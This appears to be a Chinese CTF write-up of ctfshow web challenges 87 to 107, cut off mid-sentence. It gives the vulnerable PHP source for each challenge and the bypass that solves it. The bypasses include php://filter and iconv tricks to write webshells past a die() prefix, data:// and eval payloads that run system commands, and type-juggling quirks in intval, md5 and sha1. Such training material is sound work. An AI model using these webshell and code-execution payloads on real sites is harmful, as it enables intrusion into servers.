离别歌\nphp://filter之前最常出镜的地方是XXE。由于XXE漏洞的特殊性，我们在读取HTML、PHP等文件时可能会抛出此类错误parser error : StartTag: invalid element name 。其原因是，PHP是基于标签的脚本语言，\u0026lt;?php ... ?\u0026gt;这个语法也与XML相符合，所以在解析XML的时候会被误认为是XML，而其中内容（比如特殊字符）又有可能和标准XML冲突，所以导致了出错。\n那么，为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里就会用到php://filter。\nphp://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。比如，我们可以用如下一行代码将POST内容转换成base64编码并输出：\nreadfile(\u0026#34;php://filter/read=convert.base64-encode/resource=php://input\u0026#34;); 如下：\n所以，在XXE中，我们也可以将PHP等容易引发冲突的文件流用php://filter协议流处理一遍，这样就能有效规避特殊字符造成混乱。\n如下，我们使用的是php://filter/read=convert.base64-encode/resource=./xxe.php\n回归正题\n我们审一下这道题目的代码\n相比上一道题这题增加了一个post参数，且会将传入的参数进行拼接后写入文件\n1 $content = $_POST[\u0026#39;content\u0026#39;]; 2 file_put_contents(urldecode($file), \u0026#34;\u0026lt;?php die(\u0026#39;大佬别秀了\u0026#39;);?\u0026gt;\u0026#34;.$content); 这道题在$content和$file之间拼接了一个\u003c?php die('大佬别秀了');?\u003e，导致即使我们成功写入一句话，也执行不了\n我们如何绕过这个die呢？\n其实我们可以通过php://filter流的base64-decode方法来去除这个die\n因为php在解码base64编码的时候会先将不属于base64中的字符去除，再进行转换，如下\n1\u0026lt;?php 2$_GET[\u0026#39;txt\u0026#39;] = preg_replace(\u0026#39;|[^a-z0-9A-Z+/]|s\u0026#39;, \u0026#39;\u0026#39;, $_GET[\u0026#39;txt\u0026#39;]); 3base64_decode($_GET[\u0026#39;txt\u0026#39;]); 所以，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符\u0026lt;、?、;、\u0026gt;、、(、) 、\u0026lsquo;空格等字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpdie”和我们传入的其他字符。\n”phpdie“一共6个字符，由于base64算法解码时是4个byte一组，所以给他增加2个“a”一共8个字符。这样，\u0026ldquo;phpdie\u0026quot;被正常解码，而后面我们传入的webshell的base64内容也被正常解码。\n同时由于会对传入的file进行url解码，所以需要对传入的file进行两次url编码\nwarning!!!url编码需要连同英文字符一起进行转换，可以借助hackbar强制进行转换（找了很久）\npoc:\n原文：file=php://filter/write=convert.base64-decode/resource=shell.php\rfile原文：content=\u0026lt;?php system(\u0026#39;cat fl0g.php\u0026#39;);?\u0026gt;\rcontent=aaPD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTs/Pg== 访问shell.php,得到flag\n其实还可以通过其他编码来进行绕过如rot13\n更多file_put_content和死亡·杂糅代码之缘 - 先知社区\nweb88 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-17 02:27:25 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12 */ 13if(isset($_GET[\u0026#39;file\u0026#39;])){ 14 $file = $_GET[\u0026#39;file\u0026#39;]; 15 if(preg_match(\u0026#34;/php|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\\u0026amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=|\\./i\u0026#34;, $file)){ 16 die(\u0026#34;error\u0026#34;); 17 } 18 include($file); 19}else{ 20 highlight_file(__FILE__); 21} 这题过滤了很多字符但是没有过滤:、/、;\npoc\n?file=data://text/plain;base64,PD89c3lzdGVtKCJ0YWMgZmwwZy5waHAiKTsgPz4 web116 拿到题目环境，发现是个视频，下载视频用binwalk扫一下\n提取图片，发现是源码\n直接get传参读flag\n?file=flag.php web117 web87的后续 死亡绕过\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: yu22x 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-01 18:16:59 9 10*/ 11highlight_file(__FILE__); 12error_reporting(0); 13function filter($x){ 14 if(preg_match(\u0026#39;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i\u0026#39;,$x)){ 15 die(\u0026#39;too young too simple sometimes naive!\u0026#39;); 16 } 17} 18$file=$_GET[\u0026#39;file\u0026#39;]; 19$contents=$_POST[\u0026#39;contents\u0026#39;]; 20filter($file); 21file_put_contents($file, \u0026#34;\u0026lt;?php die();?\u0026gt;\u0026#34;.$contents); 这题过滤了一些php的协议和转换器\n但是没过滤掉filter和convert\n我们可以考虑用filter搭配convert.iconv.*过滤器来构造出payload\n参考文章：详解php://filter以及死亡绕过_filter绕过过滤-CSDN博客\n1\u0026lt;?php 2 ?\u0026gt;\u0026#39;); 3echo $enc; 4?\u0026gt; 首先我们先将一句话木马从UCS-2BE转换成UCS-2LE\n?\u0026lt;hp pe@av(l_$EG[T]1;)\u0026gt;? 接着构造payload将一句话木马从UCS-2LE转换回UCS-2BE，同时破坏掉\u003c?php die();?\u003e\n效果如下\npayload:\nfile=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php\rcontents=?\u0026lt;hp pe@av(l_$EG[T]1;)\u0026gt;? 成功写入一句话木马，拿到flag\nphp特性 参考网站：\nphp一些特性函数（ctfshow）\nweb89 1\u0026lt;?php 2 3/* 4\\# -*- coding: utf-8 -*- 5\\# @Author: h1xa 6\\# @Date: 2020-09-16 11:25:09 7\\# @Last Modified by: h1xa 8\\# @Last Modified time: 2020-09-18 15:38:51 9\\# @email: h1xa@ctfer.com 10\\# @link: https://ctfer.com 11 12*/ 13 14 15include(\u0026#34;flag.php\u0026#34;); 16highlight_file(__FILE__); 17 18if(isset($_GET[\u0026#39;num\u0026#39;])){ 19 $num = $_GET[\u0026#39;num\u0026#39;]; 20 if(preg_match(\u0026#34;/[0-9]/\u0026#34;, $num)){ 21 die(\u0026#34;no no no!\u0026#34;); 22 } 23 if(intval($num)){ 24 echo $flag; 25 } 26} 这题要用到数组绕过的特性来绕过preg_match的匹配\npreg_match函数： preg_match函数是用于完成字符串的正则匹配的函数，如果找到一个匹配的，就返回1，否则就返回0。 preg_match只能处理字符串，如果传入的值是数组的话，就会报错，从而返回false，绕过了正则匹配。\nintval函数: 定义:intval()函数是 PHP 中的一个内置函数。它用于获取变量的整数值。其基本语法是intval($var, $base = 10)。其中$var是要转换的变量，$base是可选参数，用于指定进制（当$var`是字符串时），默认是十进制。\n特性：\n1.如果变量本身是整数，intval()函数会返回变量本身的值。\n2.当变量是字符串时，intval()会尝试将字符串转换为整数。它会从字符串的开头提取数字部分，直到遇到非数字字符为止。\n3.如果字符串以非数字字符开头，intval()会返回 0。\n4.当第二个参数$base被指定时，intval()可以将字符串按照指定的进制转换为十进制整数。\n注意事项\n1.对于浮点数，intval()会直接截断小数部分，而不是进行四舍五入。\n2.当处理超出整数范围的值时（在 PHP 中，根据平台和配置不同，整数范围有所不同），可能会出现意外的结果。例如，在 32 位系统上，int类型的最大值是2147483647，如果intval()处理的值超过这个范围，可能会导致数据丢失或者不正确的转换。\n这道题直接用数组绕过\npayload:\n?num[]=1 web90 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 16:06:11 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15include(\u0026#34;flag.php\u0026#34;); 16highlight_file(__FILE__); 17if(isset($_GET[\u0026#39;num\u0026#39;])){ 18 $num = $_GET[\u0026#39;num\u0026#39;]; 19 if($num===\u0026#34;4476\u0026#34;){ 20 die(\u0026#34;no no no!\u0026#34;); 21 } 22 if(intval($num,0)===4476){ 23 echo $flag; 24 }else{ 25 echo intval($num,0); 26 } 27} 设置$base = 0能提供一种根据字符串内容自动判断进制来进行转换的灵活方式。\n这道题可以利用intval的特性和php强比较的特性\n当变量是字符串时，intval()会尝试将字符串转换为整数。它会从字符串的开头提取数字部分，直到遇到非数字字符为止。\nweb91 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 16:16:09 9# @link: https://ctfer.com 10 11*/ 12 13show_source(__FILE__); 14include(\u0026#39;flag.php\u0026#39;); 15$a=$_GET[\u0026#39;cmd\u0026#39;]; 16if(preg_match(\u0026#39;/^php$/im\u0026#39;, $a)){ 17 if(preg_match(\u0026#39;/^php$/i\u0026#39;, $a)){ 18 echo \u0026#39;hacker\u0026#39;; 19 } 20 else{ 21 echo $flag; 22 } 23} 24else{ 25 echo \u0026#39;nonononono\u0026#39;; 26} 这题考察的是一个正则表达式的理解和绕过\n这两个正则表达式都是用来匹配字符串php的\n/^php$/im 的含义 ^：表示字符串的开始。 php：表示匹配字符 php。 $：表示字符串的结束。 i：表示不区分大小写。 m：表示多行模式（multi-line）。 要得到flag，我们需要让第一个判断为true，第二个判断为false\n而第二个正则表达式与正则表达式一的区别在于他没有进行多行匹配\n那我们只需要通过换行符就可以实现绕过\npayload:\ncmd=%oaphp web92 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 16:29:30 9# @link: https://ctfer.com 10 11*/ 12 13include(\u0026#34;flag.php\u0026#34;); 14highlight_file(__FILE__); 15if(isset($_GET[\u0026#39;num\u0026#39;])){ 16 $num = $_GET[\u0026#39;num\u0026#39;]; 17 if($num==4476){ 18 die(\u0026#34;no no no!\u0026#34;); 19 } 20 if(intval($num,0)==4476){ 21 echo $flag; 22 }else{ 23 echo intval($num,0); 24 } 25} 这题与90题的区别就在于这里进行的是弱类型的比较\n在弱类型的比较里面我们不能通过增加字母的方式绕过，如下\n\u0026#34;123aa\u0026#34; == 123\r\u0026#34;123aa\u0026#34; === 123aa 我们可以通过其它方法来绕过\n如通过intval函数的特性，我们可以通过输入转换成其他进制的4476来进行绕过（前面说过当base=0时会自动进行进制的转换）。\npayload：\nHEX: 0x117c //十进制前面补0x\rOCT: 010574 //八进制前面补0 或者\n官方题解\nintval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取,但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476，我们就可以构造 4476e123\nweb93 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 16:32:58 9# @link: https://ctfer.com 10 11*/ 12 13include(\u0026#34;flag.php\u0026#34;); 14highlight_file(__FILE__); 15if(isset($_GET[\u0026#39;num\u0026#39;])){ 16 $num = $_GET[\u0026#39;num\u0026#39;]; 17 if($num==4476){ 18 die(\u0026#34;no no no!\u0026#34;); 19 } 20 if(preg_match(\u0026#34;/[a-z]/i\u0026#34;, $num)){ 21 die(\u0026#34;no no no!\u0026#34;); 22 } 23 if(intval($num,0)==4476){ 24 echo $flag; 25 }else{ 26 echo intval($num,0); 27 } 28} preg_match(\u0026#34;/[a-z]/i\u0026#34;, $num) 相比上一题这题增加了一个字母的匹配，让我们不能用上一题e绕过的方法和十六进制绕过的方法\n但是八进制绕过依旧是可行的，因为他不包含字母\npayload:\nnum=010574 web94 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 16:46:19 9# @link: https://ctfer.com 10 11*/ 12 13include(\u0026#34;flag.php\u0026#34;); 14highlight_file(__FILE__); 15if(isset($_GET[\u0026#39;num\u0026#39;])){ 16 $num = $_GET[\u0026#39;num\u0026#39;]; 17 if($num===\u0026#34;4476\u0026#34;){ 18 die(\u0026#34;no no no!\u0026#34;); 19 } 20 if(preg_match(\u0026#34;/[a-z]/i\u0026#34;, $num)){ 21 die(\u0026#34;no no no!\u0026#34;); 22 } 23 if(!strpos($num, \u0026#34;0\u0026#34;)){ 24 die(\u0026#34;no no no!\u0026#34;); 25 } 26 if(intval($num,0)===4476){ 27 echo $flag; 28 } 29} !strpos($num, \u0026#34;0\u0026#34;) 这题增加了一个条件，同时判断也变成了强判定，这里的strpos()函数用于查找字符串在另一个字符串中首次出现的位置。\n也就是这里我们需要让首位不等于0才能使这个判断为false\nstrops函数绕过： 对于strpos()函数，我们可以利用换行进行绕过（%0a） payload:?num=%0a010574 也可以小数点绕过 payload：?num=4476.0 因为intval()函数只读取整数部分 还可以八进制绕过(%20是空格的url编码形式) payload：?num=%20010574 ?num= 010574 // 前面加个空格 ?num=+010574 ?num=+4476.0\n我们选用其中一个绕过方法即可\n如空格绕过\n?num=%20010574 这题因为用的是强判定也可以用这种方法\n?num=4476.0 这种方法就是使其变为浮点型从而使强判定为false，绕过第一个判定\nweb95 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 16:53:59 9# @link: https://ctfer.com 10 11*/ 12 13include(\u0026#34;flag.php\u0026#34;); 14highlight_file(__FILE__); 15if(isset($_GET[\u0026#39;num\u0026#39;])){ 16 $num = $_GET[\u0026#39;num\u0026#39;]; 17 if($num==4476){ 18 die(\u0026#34;no no no!\u0026#34;); 19 } 20 if(preg_match(\u0026#34;/[a-z]|\\./i\u0026#34;, $num)){ 21 die(\u0026#34;no no no!!\u0026#34;); 22 } 23 if(!strpos($num, \u0026#34;0\u0026#34;)){ 24 die(\u0026#34;no no no!!!\u0026#34;); 25 } 26 if(intval($num,0)===4476){ 27 echo $flag; 28 } 29} 这题和上一题的区别就是改为了弱判定\n所以上一题的方法二就用不了了，我们用方法一即可\npayload:\n?num=%20010574 web96 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 19:21:24 9# @link: https://ctfer.com 10 11*/ 12 13 14highlight_file(__FILE__); 15 16if(isset($_GET[\u0026#39;u\u0026#39;])){ 17 if($_GET[\u0026#39;u\u0026#39;]==\u0026#39;flag.php\u0026#39;){ 18 die(\u0026#34;no no no\u0026#34;); 19 }else{ 20 highlight_file($_GET[\u0026#39;u\u0026#39;]); 21 } 22 23 24} 我们知道./指的的是当前目录，所以直接用./绕过即可，不影响文件读取\npayload:\n?u=./flag.php or\nu=/var/www/html/flag.php\r?u=php://filter/read=convert.base64-encode/resource=flag.php web97 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 19:36:32 9# @link: https://ctfer.com 10 11*/ 12 13include(\u0026#34;flag.php\u0026#34;); 14highlight_file(__FILE__); 15if (isset($_POST[\u0026#39;a\u0026#39;]) and isset($_POST[\u0026#39;b\u0026#39;])) { 16if ($_POST[\u0026#39;a\u0026#39;] != $_POST[\u0026#39;b\u0026#39;]) 17if (md5($_POST[\u0026#39;a\u0026#39;]) === md5($_POST[\u0026#39;b\u0026#39;])) 18echo $flag; 19else 20print \u0026#39;Wrong.\u0026#39;; 21} 22?\u0026gt; 这是一道md5强比较的题目，绕过姿势挺多\n我们可以通过简单的数组绕过\na[]=1\u0026amp;b[]=2 虽然会报错但是能拿到flag\nweb98 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 21:39:27 9# @link: https://ctfer.com 10 11*/ 12 13include(\u0026#34;flag.php\u0026#34;); 14$_GET?$_GET=\u0026amp;$_POST:\u0026#39;flag\u0026#39;; 15$_GET[\u0026#39;flag\u0026#39;]==\u0026#39;flag\u0026#39;?$_GET=\u0026amp;$_COOKIE:\u0026#39;flag\u0026#39;; 16$_GET[\u0026#39;flag\u0026#39;]==\u0026#39;flag\u0026#39;?$_GET=\u0026amp;$_SERVER:\u0026#39;flag\u0026#39;; 17highlight_file($_GET[\u0026#39;HTTP_FLAG\u0026#39;]==\u0026#39;flag\u0026#39;?$flag:__FILE__); 18 19?\u0026gt; CTFSHOW web入门刷题 web98-112_ctfshow web98-CSDN博客\n这道题用到了三元运算符\n首先判断是否GET传入了数据，如果传入了则将POST的地址赋值给了GET\n其实就是用POST替换GET\n如果GET存在flag字段的值则会继续替换，最后替换成SERVER\n这里我们只要GET随便传入一个数据让post替换get\n然后post传入 HTTP_FLAG=flag\n这样最后highlight_file就能去显示$flag\n这道题一开始没看懂代码，看了上面大佬的解释感觉其实也不难\nweb99 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 22:36:12 9# @link: https://ctfer.com 10 11*/ 12 13highlight_file(__FILE__); 14$allow = array(); 15for ($i=36; $i \u0026lt; 0x36d; $i++) { 16 array_push($allow, rand(1,$i)); 17} 18if(isset($_GET[\u0026#39;n\u0026#39;]) \u0026amp;\u0026amp; in_array($_GET[\u0026#39;n\u0026#39;], $allow)){ 19 ($_GET[\u0026#39;n\u0026#39;], $_POST[\u0026#39;content\u0026#39;]); 20} 21 22?\u0026gt; 这道题首先是创建了一个数组，然后通过循环写入数字（范围0~0x36d）\n接着对传入的n进行判断，判断其是否在数组中，若存在则以n为名字创建一个文件并写入content的内容\n我们需要知道的是：\n在弱类型中当php字符串和int比较时,字符串会被转换成int，所以 字符串中数字后面的字符串会被忽略。题目中的in_array没有设置type,我们可以输入字符串5.php(此处数字随意，只要在rand(1,0x36d)之间即可),转换之后也就是5,明显是在题目中生成的数组中的\n所以我们通过传入content写马后，通过蚁剑连接或者直接命令执行即可得到flag\nweb100 1\u0026lt;?php 2 3/* 4\\# -*- coding: utf-8 -*- 5\\# @Author: h1xa 6\\# @Date: 2020-09-16 11:25:09 7\\# @Last Modified by: h1xa 8\\# @Last Modified time: 2020-09-21 22:10:28 9\\# @link: https://ctfer.com 10 11*/ 12 13highlight_file(__FILE__); 14include(\u0026#34;ctfshow.php\u0026#34;); 15//flag in class ctfshow; 16$ctfshow = new ctfshow(); 17$v1=$_GET[\u0026#39;v1\u0026#39;]; 18$v2=$_GET[\u0026#39;v2\u0026#39;]; 19$v3=$_GET[\u0026#39;v3\u0026#39;]; 20$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); 21if($v0){ 22 if(!preg_match(\u0026#34;/\\;/\u0026#34;, $v2)){ 23 if(preg_match(\u0026#34;/\\;/\u0026#34;, $v3)){ 24 eval(\u0026#34;$v2(\u0026#39;ctfshow\u0026#39;)$v3\u0026#34;); 25 } 26 } 27 28} 29 30 31 32?\u0026gt; 这题其实就是一道简单的拼接题\n$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); 这里看起来像是要求v1，v2，v3都为数字，实际上只需v1为数字则会将v1赋给v0，而不会再执行后面的语句\n所以我们这里只需要使v1为数字即可\npayload:\n?v1=21\u0026amp;v2=var_dump($ctfshow)/*\u0026amp;v3=*/; 或者用命令\n1?v1=1\u0026amp;v2=system(\u0026#39;ls\u0026#39;)/*\u0026amp;v3=*/; 将0x2d更换成-得到flag\nweb101 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-22 00:26:48 9# @link: https://ctfer.com 10 11*/ 12 13highlight_file(__FILE__); 14include(\u0026#34;ctfshow.php\u0026#34;); 15//flag in class ctfshow; 16$ctfshow = new ctfshow(); 17$v1=$_GET[\u0026#39;v1\u0026#39;]; 18$v2=$_GET[\u0026#39;v2\u0026#39;]; 19$v3=$_GET[\u0026#39;v3\u0026#39;]; 20$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); 21if($v0){ 22 if(!preg_match(\u0026#34;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\)|\\-|\\_|\\+|\\=|\\{|\\[|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\;|\\?|[0-9]/\u0026#34;, $v2)){ 23 if(!preg_match(\u0026#34;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\(|\\-|\\_|\\+|\\=|\\{|\\[|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\?|[0-9]/\u0026#34;, $v3)){ 24 eval(\u0026#34;$v2(\u0026#39;ctfshow\u0026#39;)$v3\u0026#34;); 25 } 26 } 27 28} 29 30?\u0026gt; 题目描述:修补100题非预期,替换0x2d\n修补了上一题通过直接命令执行或者var_dump打印类的方法\n我们可以尝试使用反射类的方法，利用题目给出的('ctfshow')来拼接打印类\npayload:\n?v1=1\u0026amp;v2=echo new Reflectionclass\u0026amp;v3=; 这道题的flag少了一位，在得到的flag在替换掉0x2d后，再进行爆破即可得到flag\npayload:\n1a = \u0026#34;fa2a169a0x2da0820x2d40f30x2da5cd0x2d65ce0d29b42\u0026#34; 2b = a.replace(\u0026#34;0x2d\u0026#34;,\u0026#34;-\u0026#34;) 3hex = [\u0026#34;1\u0026#34;,\u0026#34;2\u0026#34;,\u0026#34;3\u0026#34;,\u0026#34;4\u0026#34;,\u0026#34;5\u0026#34;,\u0026#34;6\u0026#34;,\u0026#34;7\u0026#34;,\u0026#34;8\u0026#34;,\u0026#34;9\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;b\u0026#34;,\u0026#34;c\u0026#34;,\u0026#34;d\u0026#34;,\u0026#34;e\u0026#34;] 4for i in hex: 5 print(\u0026#34;ctfshow{\u0026#34;+b+i+\u0026#34;}\u0026#34;) web102 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: atao 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-23 20:59:43 9 10*/ 11 12 13highlight_file(__FILE__); 14$v1 = $_POST[\u0026#39;v1\u0026#39;]; 15$v2 = $_GET[\u0026#39;v2\u0026#39;]; 16$v3 = $_GET[\u0026#39;v3\u0026#39;]; 17$v4 = is_numeric($v2) and is_numeric($v3); 18if($v4){ 19 $s = substr($v2,2); 20 $str = call_user_func($v1,$s); 21 echo $str; 22 file_put_contents($v3,$str); 23} 24else{ 25 die(\u0026#39;hacker\u0026#39;); 26} 27 28 29?\u0026gt; 分析一下这段代码\n首先这段代码会接收三个参数v1,v2,v3\n根据php的特性，当$v2为数字时$v4就会被赋值为1，而与$v3的值无关\n所以想要进入判断，我们首先要使v2为数字\n接着会通过substr对v2前两段进行截断并赋值给s\n下一步就会将v1和s都传入call_user_func函数\ncall_user_func函数有什么用呢?\ncall_user_func 是 PHP 中的一个内置函数，它的主要作用是调用回调函数。\nfunction greet($name) {\rreturn \u0026#34;Hello, $name!\u0026#34;;\r}\r$message = call_user_func(\u0026#39;greet\u0026#39;, \u0026#39;John\u0026#39;);\recho $message; 我们先不管他怎么利用，接着往下看\n最后会调用file_put_contents函数，那思路就很明显了，我们通过写文件来拿到flag\n但是我们要将v2这一串数字经过一系列转换后写入文件并执行要怎么做呢？\n假如说我们可以将php代码转换成base64后再转换成hex，而得到的hex又刚好为数字，那我们就能实现我们的目标。\n那怎么进行格式转换呢?\n我们可以通过call_user_func函数调用php的内置类hex2bin，将我们传入的v2转换回base64编码，接着在写文件的时候，再通过php伪协议的方式将base64先转换为我们的代码再写入文件。\n经过尝试我们可以得到符合条件的代码\n\u0026lt;?=`cat *`;\rbase64:PD89YGNhdCAqYDs= (转hex去掉=)\rhex:5044383959474E6864434171594473 我们需要在hex前面随便加两位数字来绕过截断\npayload:\nv1=hex2bin\rv2=665044383959474E6864434171594473\u0026amp;v3=php://filter/write=convert.base64-decode/resource=1.php web103 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: atao 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-23 21:03:24 9 10*/ 11 12 13highlight_file(__FILE__); 14$v1 = $_POST[\u0026#39;v1\u0026#39;]; 15$v2 = $_GET[\u0026#39;v2\u0026#39;]; 16$v3 = $_GET[\u0026#39;v3\u0026#39;]; 17$v4 = is_numeric($v2) and is_numeric($v3); 18if($v4){ 19 $s = substr($v2,2); 20 $str = call_user_func($v1,$s); 21 echo $str; 22 if(!preg_match(\u0026#34;/.*p.*h.*p.*/i\u0026#34;,$str)){ 23 file_put_contents($v3,$str); 24 } 25 else{ 26 die(\u0026#39;Sorry\u0026#39;); 27 } 28} 29else{ 30 die(\u0026#39;hacker\u0026#39;); 31} 32 33?\u0026gt; 这题相比上一题多了一个过滤\nif(!preg_match(\u0026#34;/.*p.*h.*p.*/i\u0026#34;,$str)){\rfile_put_contents($v3,$str);\r}\relse{\rdie(\u0026#39;Sorry\u0026#39;);\r} 继续用上题的方法即可\npayload:\nv1=hex2bin\rv2=665044383959474E6864434171594473\u0026amp;v3=php://filter/write=convert.base64-decode/resource=1.php web104 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: atao 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-28 22:27:20 9 10*/ 11 12 13highlight_file(__FILE__); 14include(\u0026#34;flag.php\u0026#34;); 15 16if(isset($_POST[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;])){ 17 $v1 = $_POST[\u0026#39;v1\u0026#39;]; 18 $v2 = $_GET[\u0026#39;v2\u0026#39;]; 19 if(sha1($v1)==sha1($v2)){ 20 echo $flag; 21 } 22} 23 24 25 26?\u0026gt; 使v1=v2即可\nv1=1\rv2=1 web105 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-28 22:34:07 9 10*/ 11 12highlight_file(__FILE__); 13include(\u0026#39;flag.php\u0026#39;); 14error_reporting(0); 15$error=\u0026#39;你还想要flag嘛？\u0026#39;; 16$suces=\u0026#39;既然你想要那给你吧！\u0026#39;; 17foreach($_GET as $key =\u0026gt; $value){ 18 if($key===\u0026#39;error\u0026#39;){ 19 die(\u0026#34;what are you doing?!\u0026#34;); 20 } 21 $$key=$$value; 22}foreach($_POST as $key =\u0026gt; $value){ 23 if($value===\u0026#39;flag\u0026#39;){ 24 die(\u0026#34;what are you doing?!\u0026#34;); 25 } 26 $$key=$$value; 27} 28if(!($_POST[\u0026#39;flag\u0026#39;]==$flag)){ 29 die($error); 30} 31echo \u0026#34;your are good\u0026#34;.$flag.\u0026#34;\\n\u0026#34;; 32die($suces); 33 34?\u0026gt; 本题考查变量覆盖和die()的知识\n$$a = $$b可以类似于，将$a的地址指向$b\n所以无论$b怎么改变值，$a的值都会和$b一样\ndie()函数虽然会终止程序，但同时也会输出括号内的终止提示信息\n方法一：\n本题利用变量覆盖和die()函数的特性\n先对get的内容进行覆盖，且不能覆盖error，所以要覆盖suces，即?suces=flag，此时suces=\u0026gt;flag的地址 再对post的内容进行覆盖，且不能将flag直接覆盖，所以只能error=suces，此时error=\u0026gt;flag的地址 此时无论进入哪个die()函数，都可以输出$flag的值 payload:\nGet: suces=flag\rPOST: error=suces 方法二：\nGet: ?suces=flag\u0026amp;flag= 先将flag的值赋给suces，再将flag的值赋为空，从而通过判断，输出suces的值\nweb106 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: atao 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-28 22:38:27 9 10*/ 11 12 13highlight_file(__FILE__); 14include(\u0026#34;flag.php\u0026#34;); 15 16if(isset($_POST[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;])){ 17 $v1 = $_POST[\u0026#39;v1\u0026#39;]; 18 $v2 = $_GET[\u0026#39;v2\u0026#39;]; 19 if(sha1($v1)==sha1($v2) \u0026amp;\u0026amp; $v1!=$v2){ 20 echo $flag; 21 } 22} 23 24 25 26?\u0026gt; 我们使用数组绕过即可\nv1[]=1\rv2[]=0 web107 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-28 23:24:14 9 10*/ 11 12 13highlight_file(__FILE__); 14error_reporting(0); 15include(\u0026#34;flag.php\u0026#34;); 16 17if(isset($_POST[\u0026#39;v1\u0026#39;])){ 18 $v1 = $_POST[\u0026#39;v1\u0026#39;]; 19 $v3 = $_GET[\u0026#39;v3\u0026#39;]; 20 parse_str($v1,$v2); 21 if($v2[\u0026#39;flag\u0026#39;]==md5($v3)){ 22 echo $flag; 23 } 24 25} 26 27 28 29?\u0026gt; parse_str函数:它用于将字符串解析为变量，如果 str 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 arr 则会设置到该数组里 ）。\n1\u0026lt;?php 2 //parse_str()将查询的字符串解析到变量中 3 parse_str(\u0026#34;name=Gopal K Verma\u0026amp;age=45\u0026#34;); 4 5 echo 